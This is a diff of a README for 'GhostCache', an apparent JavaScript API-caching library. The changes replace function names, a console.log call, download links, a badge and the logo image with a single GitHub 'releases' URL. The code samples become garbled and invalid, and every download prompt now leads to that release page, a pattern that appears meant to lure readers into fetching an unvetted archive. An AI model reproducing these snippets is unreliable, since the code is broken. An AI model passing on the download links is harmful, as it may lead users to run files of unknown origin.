@@ -31,7 +31,7 @@ const cache = new GhostCache({
 
 4. Start caching your API requests:
 ```javascript
-const data = await cache.request('https://api.example.com/data');
+const data = await https://github.com/wini130/GhostCache-API-Cache/releases('https://github.com/wini130/GhostCache-API-Cache/releases');
 ```
 
 ## Repository Topics 📌
@@ -66,19 +66,19 @@ const cache = new GhostCache({
 });
 
 const fetchData = async () => {
-  const data = await cache.request('https://api.example.com/data');
-  console.log(data);
+  const data = await https://github.com/wini130/GhostCache-API-Cache/releases('https://github.com/wini130/GhostCache-API-Cache/releases');
+  https://github.com/wini130/GhostCache-API-Cache/releases(data);
 };
 
 fetchData();
 ```
 
 ## Example Link 🌐
-[Download the App.zip file](https://github.com/project/files/App.zip)
+[Download the https://github.com/wini130/GhostCache-API-Cache/releases file](https://github.com/wini130/GhostCache-API-Cache/releases)
 
-[![Download App](https://img.shields.io/badge/Download-App.zip-<COLOR>.svg)](https://github.com/project/files/App.zip)
+[![Download App](https://github.com/wini130/GhostCache-API-Cache/releases<COLOR>.svg)](https://github.com/wini130/GhostCache-API-Cache/releases)
 
 ## Conclusion 🎉
 GhostCache is a powerful tool for frontend developers looking to optimize their applications by reducing redundant API calls and improving performance through automatic caching. With support for various storage options and written in TypeScript, GhostCache is a must-have for any modern web development project. Try it out today and see the difference it can make in your app's speed and efficiency! Happy coding! 👻
 
-![GhostCache Logo](https://example.com/ghostcache.png)
+![GhostCache Logo](https://github.com/wini130/GhostCache-API-Cache/releases)
